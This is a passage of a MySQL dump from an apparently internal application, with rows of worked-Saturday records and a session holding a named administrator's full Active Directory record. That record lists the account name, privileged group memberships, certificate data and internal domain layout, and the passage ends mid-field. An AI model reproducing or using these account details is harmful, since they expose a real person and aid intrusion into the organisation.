03:19:47'),(410,200,'2024-09-14',NULL,'DISPONIBLE',NULL,'2024-09-15 04:44:06','2024-09-15 04:44:06'),(411,486,'2024-09-21','2026-06-21','APROBADO',NULL,'2024-09-21 20:34:15','2026-01-07 08:17:50'),(412,371,'2024-09-21','2025-09-26','PENDIENTE',NULL,'2024-09-23 06:39:11','2025-10-06 08:36:06'),(413,292,'2024-09-28',NULL,'DISPONIBLE',NULL,'2024-09-28 22:13:05','2024-09-28 22:13:05'),(414,449,'2024-09-28','2025-06-22','APROBADO',NULL,'2024-09-28 22:17:17','2025-03-17 06:01:53'),(415,167,'2024-09-28',NULL,'DISPONIBLE',NULL,'2024-09-30 07:29:41','2024-09-30 07:29:41'),(416,247,'2024-10-05','2026-07-27','APROBADO',NULL,'2024-10-06 03:09:54','2026-02-06 10:45:29'),(417,253,'2024-10-19',NULL,'DISPONIBLE',NULL,'2024-10-22 08:54:41','2024-10-22 08:54:41'),(418,244,'2024-10-26',NULL,'DISPONIBLE',NULL,'2024-10-26 22:37:43','2024-10-26 22:37:43'),(419,200,'2024-10-26',NULL,'DISPONIBLE',NULL,'2024-10-27 05:08:26','2024-10-27 05:08:26'),(420,202,'2024-10-26','2025-08-14','SOLICITADO',NULL,'2024-10-28 13:25:25','2025-02-08 06:18:00'),(421,467,'2024-11-02','2025-04-23','APROBADO',NULL,'2024-11-02 21:42:39','2025-01-07 06:22:58'),(422,469,'2024-11-02',NULL,'DISPONIBLE',NULL,'2024-11-04 08:16:43','2024-11-04 08:16:43'),(423,458,'2024-11-09',NULL,'DISPONIBLE',NULL,'2024-11-04 10:21:55','2024-11-04 10:21:55'),(424,443,'2024-11-02','2025-09-20','APROBADO',NULL,'2024-11-05 17:30:53','2025-09-09 05:17:28'),(425,306,'2024-11-09',NULL,'DISPONIBLE',NULL,'2024-11-11 08:33:41','2024-11-11 08:33:41'),(426,197,'2024-11-16',NULL,'DISPONIBLE',NULL,'2024-11-17 01:04:35','2024-11-17 06:29:55'),(427,486,'2024-11-23','2026-07-25','APROBADO',NULL,'2024-11-24 00:24:17','2026-01-07 08:17:57'),(428,196,'2024-11-30','2025-08-21','APROBADO',NULL,'2024-11-30 21:12:10','2025-01-29 11:20:54'),(429,201,'2024-11-30',NULL,'DISPONIBLE',NULL,'2024-12-02 14:29:05','2024-12-02 14:29:05'),(430,207,'2024-12-07','2025-01-11','SOLICITADO',NULL,'2024-12-07 21:27:46','2024-12-12 12:01:10'),(431,200,'2024-12-07',NULL,'DISPONIBLE',NULL,'2024-12-08 05:19:22','2024-12-08 07:59:33'),(432,458,'2024-12-14',NULL,'DISPONIBLE',NULL,'2024-12-14 21:24:17','2024-12-14 21:24:17'),(433,292,'2024-12-21',NULL,'DISPONIBLE',NULL,'2024-12-22 21:59:29','2024-12-23 05:49:16'),(435,382,'2024-12-28','2025-02-14','SOLICITADO',NULL,'2024-12-24 09:56:26','2024-12-24 10:32:35'),(436,371,'2024-12-28','2026-08-17','PENDIENTE',NULL,'2024-12-30 19:17:49','2026-04-28 16:03:19'),(437,450,'2025-01-04',NULL,'DISPONIBLE',NULL,'2025-01-06 04:07:52','2025-01-06 04:07:52'),(438,201,'2025-01-11',NULL,'DISPONIBLE',NULL,'2025-01-11 22:04:39','2025-01-11 22:04:39'),(440,200,'2025-01-18',NULL,'DISPONIBLE',NULL,'2025-01-19 00:40:42','2025-01-19 00:40:42'),(441,244,'2025-01-18',NULL,'DISPONIBLE',NULL,'2025-01-19 03:05:33','2025-01-19 03:05:33'),(442,455,'2025-01-25','2026-04-21','APROBADO',NULL,'2025-01-25 23:30:40','2026-03-10 09:14:21'),(443,443,'2025-01-25','2025-09-21','APROBADO',NULL,'2025-01-26 02:21:46','2025-09-09 05:17:32'),(444,253,'2025-01-25',NULL,'DISPONIBLE',NULL,'2025-01-27 07:50:39','2025-01-27 07:50:39'),(445,239,'2025-02-01','2026-08-31','APROBADO',NULL,'2025-02-01 21:51:52','2026-02-25 06:18:36'),(446,202,'2025-02-01','2025-08-24','SOLICITADO',NULL,'2025-02-03 08:20:25','2025-02-08 06:18:20'),(448,486,'2025-02-08','2026-09-05','APROBADO',NULL,'2025-02-08 21:13:39','2026-04-27 11:57:37'),(449,306,'2025-02-15',NULL,'DISPONIBLE',NULL,'2025-02-17 08:07:20','2025-02-17 08:07:20'),(450,429,'2025-02-08',NULL,'DISPONIBLE',NULL,'2025-02-21 08:26:58','2025-02-21 08:26:58'),(451,483,'2025-02-22',NULL,'DISPONIBLE',NULL,'2025-02-22 21:59:33','2025-02-22 21:59:33'),(452,482,'2025-03-01',NULL,'DISPONIBLE',NULL,'2025-02-28 09:02:30','2025-02-28 09:02:30'),(453,200,'2025-03-01',NULL,'DISPONIBLE',NULL,'2025-03-02 04:54:12','2025-03-02 04:54:12'),(454,467,'2025-03-08','2025-08-03','APROBADO',NULL,'2025-03-07 13:08:47','2025-06-03 04:56:04'),(455,459,'2025-03-08','2026-04-17','APROBADO',NULL,'2025-03-07 23:25:37','2026-03-23 07:41:00'),(456,458,'2025-03-15',NULL,'DISPONIBLE',NULL,'2025-03-15 21:08:07','2025-03-15 21:08:07'),(457,449,'2025-03-15','2026-08-15','APROBADO',NULL,'2025-03-16 00:55:56','2026-03-16 06:51:13'),(458,247,'2025-03-22',NULL,'DISPONIBLE',NULL,'2025-03-23 04:00:17','2025-03-23 04:00:17'),(459,201,'2025-04-05',NULL,'DISPONIBLE',NULL,'2025-04-05 21:27:19','2025-04-05 21:27:19'),(460,369,'2025-04-05','2026-07-26','PENDIENTE',NULL,'2025-04-07 09:15:55','2026-02-13 10:49:35'),(461,371,'2025-04-05','2026-08-18','PENDIENTE',NULL,'2025-04-10 09:50:56','2026-04-28 16:03:29'),(462,455,'2025-04-12','2026-04-22','APROBADO',NULL,'2025-04-13 22:23:05','2026-03-10 09:14:25'),(463,443,'2025-04-19',NULL,'DISPONIBLE',NULL,'2025-04-21 00:38:31','2025-04-21 00:38:31'),(464,449,'2025-04-26','2026-08-16','APROBADO',NULL,'2025-04-26 23:21:02','2026-03-16 06:51:16'),(465,239,'2025-04-26',NULL,'DISPONIBLE',NULL,'2025-04-26 23:29:19','2025-04-26 23:29:19'),(466,253,'2025-05-03',NULL,'DISPONIBLE',NULL,'2025-04-30 16:11:59','2025-04-30 16:11:59'),(467,465,'2025-05-03',NULL,'DISPONIBLE',NULL,'2025-05-03 20:17:00','2025-05-03 20:17:00'),(468,455,'2025-05-03','2026-04-23','APROBADO',NULL,'2025-05-05 02:48:24','2026-03-10 09:14:29'),(469,201,'2025-05-17',NULL,'DISPONIBLE',NULL,'2025-05-17 21:15:48','2025-05-17 21:15:48'),(470,196,'2025-05-17','2026-08-14','APROBADO',NULL,'2025-05-18 20:47:52','2026-03-03 06:26:32'),(471,306,'2025-05-24',NULL,'DISPONIBLE',NULL,'2025-05-26 18:06:19','2025-05-26 18:06:19'),(472,467,'2025-05-31','2025-08-05','APROBADO',NULL,'2025-05-30 19:34:01','2025-06-03 04:56:09'),(473,482,'2025-05-31',NULL,'DISPONIBLE',NULL,'2025-06-02 04:54:01','2025-06-02 04:54:01'),(474,449,'2025-06-07','2026-08-17','APROBADO',NULL,'2025-06-11 14:00:41','2026-03-16 06:51:23'),(475,489,'2025-06-14','2025-10-02','APROBADO',NULL,'2025-06-16 23:56:47','2025-09-24 04:56:00'),(476,402,'2025-06-21','2025-08-29','PENDIENTE',NULL,'2025-06-19 16:15:25','2025-10-06 09:10:02'),(477,459,'2025-06-21','2026-06-06','SOLICITADO',NULL,'2025-06-22 00:35:20','2026-05-12 10:36:34'),(478,492,'2025-07-05','2025-07-30','APROBADO',NULL,'2025-07-03 20:42:55','2025-07-08 05:26:09'),(479,244,'2025-07-05',NULL,'DISPONIBLE',NULL,'2025-07-05 22:34:16','2025-07-05 22:34:16'),(480,467,'2025-07-12','2025-08-04','APROBADO',NULL,'2025-07-11 06:04:34','2025-07-22 12:35:35'),(481,455,'2025-07-12','2026-04-24','APROBADO',NULL,'2025-07-14 03:14:44','2026-03-10 09:14:36'),(482,371,'2025-07-12','2026-08-19','PENDIENTE',NULL,'2025-07-14 07:02:49','2026-04-28 16:03:39'),(483,239,'2025-07-19',NULL,'DISPONIBLE',NULL,'2025-07-19 20:52:21','2025-07-19 20:52:21'),(484,449,'2025-07-19',NULL,'DISPONIBLE',NULL,'2025-07-22 13:22:43','2025-07-22 13:22:43'),(485,369,'2025-06-28','2026-07-27','PENDIENTE',NULL,'2025-07-29 09:06:29','2026-02-13 10:49:47'),(486,369,'2025-08-09',NULL,'DISPONIBLE',NULL,'2025-07-29 09:07:08','2025-07-29 09:07:08'),(487,485,'2025-08-02','2025-08-17','APROBADO',NULL,'2025-08-02 05:29:42','2025-08-11 14:59:42'),(488,196,'2025-08-09','2026-08-17','APROBADO',NULL,'2025-08-09 19:39:42','2026-03-03 06:27:04'),(489,201,'2025-08-09',NULL,'DISPONIBLE',NULL,'2025-08-09 22:41:39','2025-08-10 07:30:50'),(490,253,'2025-08-09',NULL,'DISPONIBLE',NULL,'2025-08-11 10:39:52','2025-08-11 10:39:52'),(492,450,'2025-08-16',NULL,'DISPONIBLE',NULL,'2025-08-16 23:50:16','2025-08-16 23:50:16'),(493,459,'2025-08-16',NULL,'DISPONIBLE',NULL,'2025-08-16 23:50:19','2026-04-13 12:22:53'),(494,482,'2025-08-16',NULL,'DISPONIBLE',NULL,'2025-08-18 08:57:09','2025-08-18 08:57:09'),(495,486,'2025-08-23',NULL,'DISPONIBLE',NULL,'2025-08-23 19:56:42','2025-08-23 19:56:42'),(496,378,'2023-10-28',NULL,'DISPONIBLE',NULL,'2025-08-24 14:00:15','2025-08-24 14:00:15'),(497,455,'2025-08-30',NULL,'DISPONIBLE',NULL,'2025-08-31 01:41:13','2025-08-31 01:41:13'),(498,306,'2025-08-30',NULL,'DISPONIBLE',NULL,'2025-09-01 05:24:57','2025-09-01 05:24:57'),(499,247,'2025-09-06',NULL,'DISPONIBLE',NULL,'2025-09-06 23:24:00','2025-09-06 23:24:00'),(500,486,'2025-09-13',NULL,'DISPONIBLE',NULL,'2025-09-13 20:33:06','2025-09-13 20:33:06'),(501,465,'2025-09-20',NULL,'DISPONIBLE',NULL,'2025-09-21 01:39:54','2025-09-21 01:39:54'),(503,244,'2025-09-27',NULL,'DISPONIBLE',NULL,'2025-09-27 22:28:15','2025-09-27 22:28:15'),(504,402,'2025-09-27','2025-11-07','PENDIENTE',NULL,'2025-09-29 08:11:34','2025-10-06 09:10:42'),(505,467,'2025-10-04','2026-04-04','APROBADO',NULL,'2025-10-02 14:33:54','2026-01-21 07:04:38'),(506,402,'2025-03-15','2025-08-28','PENDIENTE',NULL,'2025-10-06 09:07:57','2025-10-06 09:09:52'),(507,449,'2025-10-11',NULL,'DISPONIBLE',NULL,'2025-10-11 22:18:59','2025-10-11 22:18:59'),(508,489,'2025-10-11','2025-11-08','APROBADO',NULL,'2025-10-11 23:34:06','2025-10-12 04:21:21'),(509,443,'2025-10-04',NULL,'DISPONIBLE',NULL,'2025-10-14 05:04:54','2025-10-14 05:04:54'),(510,369,'2025-09-20',NULL,'DISPONIBLE',NULL,'2025-10-14 16:31:25','2025-10-14 16:31:25'),(511,486,'2025-10-18',NULL,'DISPONIBLE',NULL,'2025-10-18 19:58:53','2025-10-19 06:40:51'),(512,371,'2025-10-18','2026-08-20','PENDIENTE',NULL,'2025-10-20 10:56:38','2026-04-28 16:03:47'),(513,483,'2025-10-25',NULL,'DISPONIBLE',NULL,'2025-10-25 22:15:02','2025-10-25 22:15:02'),(514,201,'2025-11-01',NULL,'DISPONIBLE',NULL,'2025-11-01 21:45:05','2025-11-01 21:45:05'),(515,486,'2025-11-01',NULL,'DISPONIBLE',NULL,'2025-11-01 23:08:22','2025-11-01 23:08:22'),(516,369,'2025-11-01',NULL,'DISPONIBLE',NULL,'2025-11-03 10:03:39','2025-11-03 10:03:39'),(517,492,'2025-11-08','2025-11-21','APROBADO',NULL,'2025-11-09 02:06:29','2025-11-11 14:14:46'),(518,455,'2025-11-08',NULL,'DISPONIBLE',NULL,'2025-11-10 05:34:59','2025-11-10 05:34:59'),(519,467,'2025-11-15','2026-04-05','APROBADO',NULL,'2025-11-13 14:05:44','2026-01-21 07:05:07'),(520,458,'2025-11-15',NULL,'DISPONIBLE',NULL,'2025-11-15 21:01:16','2025-11-15 21:01:16'),(521,253,'2025-11-15',NULL,'DISPONIBLE',NULL,'2025-11-20 17:54:59','2025-11-20 17:54:59'),(522,292,'2025-11-22',NULL,'DISPONIBLE',NULL,'2025-11-22 22:56:37','2025-11-22 22:56:37'),(523,247,'2025-11-29',NULL,'DISPONIBLE',NULL,'2025-11-30 00:36:37','2025-11-30 00:36:37'),(524,486,'2025-12-06',NULL,'DISPONIBLE',NULL,'2025-12-08 04:48:04','2025-12-08 04:48:04'),(525,306,'2025-12-06',NULL,'DISPONIBLE',NULL,'2025-12-09 09:28:26','2025-12-09 09:28:26'),(526,201,'2025-12-13',NULL,'DISPONIBLE',NULL,'2025-12-13 20:59:02','2025-12-13 20:59:02'),(527,244,'2025-12-20',NULL,'DISPONIBLE',NULL,'2025-12-21 00:02:50','2025-12-21 00:02:50'),(528,467,'2025-12-27','2026-04-02','APROBADO',NULL,'2025-12-27 21:42:30','2026-01-21 07:05:39'),(529,443,'2025-12-27',NULL,'DISPONIBLE',NULL,'2025-12-27 23:11:50','2025-12-28 11:32:40'),(530,369,'2025-12-13',NULL,'DISPONIBLE',NULL,'2025-12-30 11:48:53','2025-12-30 11:48:53'),(531,239,'2026-01-03',NULL,'DISPONIBLE',NULL,'2026-01-04 00:57:37','2026-01-04 07:32:39'),(532,402,'2026-01-03',NULL,'DISPONIBLE',NULL,'2026-01-07 08:04:36','2026-01-07 08:04:36'),(533,197,'2026-01-10',NULL,'DISPONIBLE',NULL,'2026-01-10 22:19:10','2026-01-10 22:19:10'),(534,196,'2026-01-24','2026-08-21','APROBADO',NULL,'2026-01-24 21:09:33','2026-03-03 06:27:35'),(535,201,'2026-01-24',NULL,'DISPONIBLE',NULL,'2026-01-24 21:51:29','2026-01-24 21:51:29'),(536,369,'2026-01-24',NULL,'DISPONIBLE',NULL,'2026-01-26 17:23:08','2026-01-26 17:23:08'),(537,245,'2026-02-07',NULL,'DISPONIBLE',NULL,'2026-01-27 10:32:47','2026-01-27 10:32:47'),(538,486,'2026-01-31',NULL,'DISPONIBLE',NULL,'2026-01-31 23:04:17','2026-01-31 23:04:17'),(539,467,'2026-02-07','2026-04-01','APROBADO',NULL,'2026-02-05 15:16:57','2026-02-10 06:18:11'),(540,455,'2026-02-07',NULL,'DISPONIBLE',NULL,'2026-02-08 02:04:34','2026-02-08 02:04:34'),(541,509,'2026-02-14',NULL,'DISPONIBLE',NULL,'2026-02-14 22:46:16','2026-02-14 22:46:16'),(542,292,'2026-02-14',NULL,'DISPONIBLE',NULL,'2026-02-14 22:47:05','2026-02-14 22:47:05'),(543,449,'2026-02-14',NULL,'DISPONIBLE',NULL,'2026-02-17 19:31:49','2026-02-17 19:31:49'),(544,247,'2026-02-21',NULL,'DISPONIBLE',NULL,'2026-02-21 23:17:54','2026-02-21 23:17:54'),(545,469,'2026-02-28',NULL,'DISPONIBLE',NULL,'2026-02-27 11:41:22','2026-02-27 11:41:22'),(546,244,'2026-02-28',NULL,'DISPONIBLE',NULL,'2026-02-28 23:32:20','2026-02-28 23:32:20'),(547,201,'2026-03-07',NULL,'DISPONIBLE',NULL,'2026-03-07 21:29:21','2026-03-07 21:29:21'),(548,467,'2026-03-21','2026-03-31','APROBADO',NULL,'2026-03-13 08:00:17','2026-03-13 08:00:54'),(549,291,'2026-03-07',NULL,'DISPONIBLE',NULL,'2026-03-13 09:29:08','2026-03-13 09:29:08'),(551,306,'2026-03-14',NULL,'DISPONIBLE',NULL,'2026-03-16 10:26:13','2026-03-16 10:26:13'),(552,499,'2026-03-21',NULL,'DISPONIBLE',NULL,'2026-03-21 21:39:02','2026-03-21 21:39:02'),(553,449,'2026-03-28',NULL,'DISPONIBLE',NULL,'2026-03-27 14:08:41','2026-03-27 14:08:41'),(554,489,'2026-04-25',NULL,'DISPONIBLE',NULL,'2026-03-27 20:53:32','2026-03-27 20:53:32'),(555,489,'2026-06-06',NULL,'DISPONIBLE',NULL,'2026-03-28 14:41:26','2026-03-28 14:41:26'),(556,458,'2026-03-28',NULL,'DISPONIBLE',NULL,'2026-03-29 01:11:26','2026-03-29 01:11:26'),(557,456,'2026-03-28',NULL,'DISPONIBLE',NULL,'2026-03-29 01:12:37','2026-03-29 01:12:37'),(558,519,'2026-04-04','2026-10-17','APROBADO',NULL,'2026-04-04 21:02:47','2026-04-13 09:54:28'),(559,456,'2026-04-04',NULL,'DISPONIBLE',NULL,'2026-04-04 21:18:08','2026-04-05 12:34:56'),(560,486,'2026-04-11',NULL,'DISPONIBLE',NULL,'2026-04-11 19:46:34','2026-04-11 19:46:34'),(561,402,'2026-04-11',NULL,'DISPONIBLE',NULL,'2026-04-13 09:56:47','2026-04-13 09:56:47'),(562,196,'2026-04-18','2026-08-24','APROBADO',NULL,'2026-04-18 21:06:15','2026-04-22 10:42:11'),(563,201,'2026-04-18',NULL,'DISPONIBLE',NULL,'2026-04-18 22:55:35','2026-04-18 22:55:35'),(564,524,'2026-04-18',NULL,'DISPONIBLE',NULL,'2026-04-18 23:39:56','2026-04-18 23:39:56'),(565,371,'2026-05-02',NULL,'DISPONIBLE',NULL,'2026-04-28 16:07:41','2026-04-28 16:07:41'),(566,509,'2026-05-02',NULL,'DISPONIBLE',NULL,'2026-05-02 21:00:36','2026-05-02 21:00:36'),(568,518,'2026-05-02',NULL,'DISPONIBLE',NULL,'2026-05-04 05:20:03','2026-05-04 05:20:03'),(569,464,'2026-05-09',NULL,'DISPONIBLE',NULL,'2026-05-06 08:50:06','2026-05-06 08:50:06'),(570,449,'2026-05-09',NULL,'DISPONIBLE',NULL,'2026-05-09 22:38:59','2026-05-09 22:38:59'),(571,292,'2026-05-09',NULL,'DISPONIBLE',NULL,'2026-05-09 22:41:50','2026-05-09 22:41:50'),(572,523,'2026-05-09',NULL,'DISPONIBLE',NULL,'2026-05-09 22:45:56','2026-05-09 22:45:56');
/*!40000 ALTER TABLE `sabados_trabajados` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sessions`
--

DROP TABLE IF EXISTS `sessions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `sessions` (
  `id` char(40) CHARACTER SET ascii COLLATE ascii_bin NOT NULL,
  `created` timestamp NOT NULL DEFAULT current_timestamp(),
  `data` blob DEFAULT NULL,
  `expires` int(10) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sessions`
--

LOCK TABLES `sessions` WRITE;
/*!40000 ALTER TABLE `sessions` DISABLE KEYS */;
INSERT INTO `sessions` VALUES ('17htnsok033ihfrrnmrofdlkm2','2026-05-06 11:51:15','Config|a:1:{s:4:\"time\";i:1778068915;}user_ldap|a:2:{s:5:\"count\";i:1;i:0;a:96:{s:11:\"objectclass\";a:5:{s:5:\"count\";i:4;i:0;s:3:\"top\";i:1;s:6:\"person\";i:2;s:20:\"organizationalPerson\";i:3;s:4:\"user\";}i:0;s:11:\"objectclass\";s:2:\"cn\";a:2:{s:5:\"count\";i:1;i:0;s:27:\"Administrador Erlantz Roman\";}i:1;s:2:\"cn\";s:2:\"sn\";a:2:{s:5:\"count\";i:1;i:0;s:13:\"Erlantz Roman\";}i:2;s:2:\"sn\";s:15:\"usercertificate\";a:2:{s:5:\"count\";i:1;i:0;s:1592:\"0Ӯ40Ӯ \"\0\0\n^CЧ“}uщ@Т\0\0\0\n^0\r	*ҶHҶч\r\00B10\n	’&ү“т,dlocal10\n	’&ү“т,dets10Uets-CEOP-CA0\r260505124813Z\r270505124813Z010\n	’&ү“т,dlocal10\n	’&ү“т,dets10USistemak10Uadministradores1$0\"UAdministrador Erlantz Roman0Ӯ\"0\r	*ҶHҶч\r\0Ӯ\00Ӯ\nӮ\0Й-ГоҫьM$У№“#Ӯё·wsЯ—Ә<Xю	»•еРXЕ-ъlZ¬пtnНзё \\PM\0B9§„әцАs /ьaҗ—д_ЈўрsӘқ”\0–©RцҫN&Dp·\0H2х…{z°Q)ҳщ^[аөhҙZ’$ўЁMы®ҹҷ,МЧyk1BӨPвйҪ*ҒХл(\n?\'Щ]ВГвҒҷkў}G>ҡҜФgКә[АY~Ј,ә4K|Nс0чgkTyBҳЪ«зҺЯэ©o“0ц-.5O—к#mфУq{GмlуРЪE»\\„ӮоҶұ(Oһ№PИҝӨяru\\^ҖрҫҮРXУuoи5вГ?~ҷ\0ЈӮд0Ӯа0U 0U |ж\'P_Ү2үү0Уүl8zЭӣ0U#0ҖШҹзгWҜҖ*…kHа4B(Ъ¶0ҒЗUҒҝ0Ғј0Ғ№ Ғ¶ ҒіҶҒ°ldap:///CN=ets-CEOP-CA(3),CN=CEOP,CN=CDP,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=ets,DC=local?certificateRevocationList?base?objectClass=cRLDistributionPoint0Ғ»+Ғ®0Ғ«0ҒЁ+0ҶҒӣldap:///CN=ets-CEOP-CA,CN=AIA,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=ets,DC=local?cACertificate?base?objectClass=certificationAuthority0	+Ӯ7\n\0U\0s\0e\0r0)U%\"0 \n+Ӯ7\n++0/U(0& $\n+Ӯ7 erromanadm@ets.local0N	+Ӯ7A0? =\n+Ӯ7 /-S-1-5-21-1482476501-1644491937-725345543-63020D	*ҶHҶч\r	7050*ҶHҶч\r\0Җ0*ҶHҶч\r\0Җ0+0\n*ҶHҶч\r0\r	*ҶHҶч\r\0Ӯ\0	ҫY<ӘҶe2Қ&қfпНxҺ7BъnҮducҡт,Yөn,\ZH2й}эРӯЧZЭъңҒ/ҢпH<1ИёҺц(P{ШН3ИХgҠҚЗ@8CҶфҺ*ДЕ‘ішпҹф/,yz“§фҮ@@ЯО=Ғ 1Ә;®ӯ»65z\'2ҶГaЖ/ӘGЫЙ‘ ҸюЯл„м9җaө\0П0ӣҚI<BcV|WаЛЎ_sC№ј??қэ‘`л!§Оs§zЩңйҗңцңq5V#bуҜцӯ!ҷэҖфSZgН[Щ№к hИүОонЛX_ҢЦBy<gtUа-Xж:ТшТяИ~хe\'v%ЬVcӮ;WОs}IҠU\";}i:3;s:15:\"usercertificate\";s:9:\"givenname\";a:2:{s:5:\"count\";i:1;i:0;s:13:\"Administrador\";}i:4;s:9:\"givenname\";s:17:\"distinguishedname\";a:2:{s:5:\"count\";i:1;i:0;s:77:\"CN=Administrador Erlantz Roman,OU=administradores,OU=Sistemak,DC=ets,DC=local\";}i:5;s:17:\"distinguishedname\";s:12:\"instancetype\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"4\";}i:6;s:12:\"instancetype\";s:11:\"whencreated\";a:2:{s:5:\"count\";i:1;i:0;s:17:\"20180417100536.0Z\";}i:7;s:11:\"whencreated\";s:11:\"whenchanged\";a:2:{s:5:\"count\";i:1;i:0;s:17:\"20260506110747.0Z\";}i:8;s:11:\"whenchanged\";s:11:\"displayname\";a:2:{s:5:\"count\";i:1;i:0;s:27:\"Administrador Erlantz Roman\";}i:9;s:11:\"displayname\";s:10:\"usncreated\";a:2:{s:5:\"count\";i:1;i:0;s:5:\"23191\";}i:10;s:10:\"usncreated\";s:8:\"memberof\";a:18:{s:5:\"count\";i:17;i:0;s:68:\"CN=gr_OT_Acceso_Remoto,OU=ETS OT,OU=UsuariosOT,OU=OT,DC=ets,DC=local\";i:1;s:85:\"CN=gr_index_admin,OU=Index,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:2;s:87:\"CN=Gr_Supervisor,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:3;s:107:\"CN=gr_ctx_estaciones,OU=Estaciones_CTX6_Netalb01,OU=Explotacion,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:4;s:37:\"CN=DnsAdmins,CN=Users,DC=ets,DC=local\";i:5;s:117:\"CN=gr_datosRed_Kontratazioak_lectura,OU=Guneak,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:6;s:68:\"CN=gr_ETS,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:7;s:42:\"CN=gr_sistemak,OU=Sistemak,DC=ets,DC=local\";i:8;s:116:\"CN=gr_Y_controlTotal,OU=ProyectosEstrategicos,OU=DatosRed,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:9;s:56:\"CN=gr_cambiar_contraseГұa_DC,OU=Sistemak,DC=ets,DC=local\";i:10;s:81:\"CN=gr_mie_admin,OU=MIE,OU=zz_Permisos,OU=Usuarios ETS,OU=Usuarios,DC=ets,DC=local\";i:11;s:49:\"CN=Operadores de copia,CN=Builtin,DC=ets,DC=local\";i:12;s:75:\"CN=Propietarios del creador de directivas de grupo,CN=Users,DC=ets,DC=local\";i:13;s:55:\"CN=AdministraciГіn de empresas,CN=Users,DC=ets,DC=local\";i:14;s:47:\"CN=Admins. del dominio,CN=Users,DC=ets,DC=local\";i:15;s:45:\"CN=Administradores,CN=Builtin,DC=ets,DC=local\";i:16;s:54:\"CN=Administradores de esquema,CN=Users,DC=ets,DC=local\";}i:11;s:8:\"memberof\";s:10:\"usnchanged\";a:2:{s:5:\"count\";i:1;i:0;s:9:\"355058107\";}i:12;s:10:\"usnchanged\";s:4:\"name\";a:2:{s:5:\"count\";i:1;i:0;s:27:\"Administrador Erlantz Roman\";}i:13;s:4:\"name\";s:10:\"objectguid\";a:2:{s:5:\"count\";i:1;i:0;s:16:\"ҒE&юаbҙFҲҪKҡ»ҮЗ\";}i:14;s:10:\"objectguid\";s:18:\"useraccountcontrol\";a:2:{s:5:\"count\";i:1;i:0;s:3:\"512\";}i:15;s:18:\"useraccountcontrol\";s:11:\"badpwdcount\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:16;s:11:\"badpwdcount\";s:8:\"codepage\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:17;s:8:\"codepage\";s:11:\"countrycode\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:18;s:11:\"countrycode\";s:15:\"badpasswordtime\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134152775244955336\";}i:19;s:15:\"badpasswordtime\";s:10:\"lastlogoff\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:20;s:10:\"lastlogoff\";s:9:\"lastlogon\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134223743366239782\";}i:21;s:9:\"lastlogon\";s:10:\"pwdlastset\";a:2:{s:5:\"count\";i:1;i:0;s:18:\"134223486122604540\";}i:22;s:10:\"pwdlastset\";s:14:\"primarygroupid\";a:2:{s:5:\"count\";i:1;i:0;s:3:\"513\";}i:23;s:14:\"primarygroupid\";s:9:\"objectsid\";a:2:{s:5:\"count\";i:1;i:0;s:28:\"\0\0\0\0\0\0\0\0ХЛ\\XЎфbе;+һ\0\0\";}i:24;s:9:\"objectsid\";s:10:\"admincount\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"1\";}i:25;s:10:\"admincount\";s:14:\"accountexpires\";a:2:{s:5:\"count\";i:1;i:0;s:19:\"9223372036854775807\";}i:26;s:14:\"accountexpires\";s:10:\"logoncount\";a:2:{s:5:\"count\";i:1;i:0;s:4:\"1266\";}i:27;s:10:\"logoncount\";s:14:\"samaccountname\";a:2:{s:5:\"count\";i:1;i:0;s:10:\"erromanadm\";}i:28;s:14:\"samaccountname\";s:14:\"samaccounttype\";a:2:{s:5:\"count\";i:1;i:0;s:9:\"805306368\";}i:29;s:14:\"samaccounttype\";s:17:\"userprincipalname\";a:2:{s:5:\"count\";i:1;i:0;s:20:\"erromanadm@ets.local\";}i:30;s:17:\"userprincipalname\";s:11:\"lockouttime\";a:2:{s:5:\"count\";i:1;i:0;s:1:\"0\";}i:31;s:11:\"lockouttime\";s:14:\"objectcategory\";a:2:{s:5:\"count\";i:1;i:0;s:52:\"CN=Person,CN=Schema,CN=Configuration,DC=ets,DC=local\";}i:32;s:14:\"objectcategory\";s:20:\"msmqsigncertificates\";a:2:{s:5:\"count\";i:1;i:0;s:896:\"\0\0\0ҝҪ”м*Ҙтjҝm7иSәЛәLЧҷапlҰOӣBВҷҚҢX\0\00ӮT0Ӯ< ӘҘZU0\r	*ҶHҶч\r\00l10U\0M\0S\0M\0Q10	U\n\0-10	U\0-1=0;U4\0E\0T\0S\0\\\0e\0r\0r\0o\0m\0a\0n\0a\0d\0m\0,\0 \0t\0l\0i\0e\0t\0x\0e\0m\0o\0n0\r231218134205Z\r311218134205Z0l10U\0M\0S\0M\0Q10	U\n\0-10	U\0-1=0;U4\0E\0T\0S\0\\\0e\0r\0r\0o\0m\0a\0n\0a\0d\0m\0,\0 \0t\0l\0i\0e\0t\0x\0e\0m\0o\0n0Ӯ\"0\r	*ҶHҶч\r\0Ӯ\00Ӯ\nӮ\0Өy\rьһЙҪ@ҮOЙx’ҶХӯxҸХХ)wВтҷW/R„H_lZ40»WMиLЬ~}ү»ҹІнҚV”ъ©§еQwЖ»-bіА#ЗтӘ…5Об\Zt…0xkӯС‘ZеE>оaЫ–ч}•зІzN`и_9э–ЭЯҝekmYеrҢс*LҘa@;ЙYЗВHЪҺ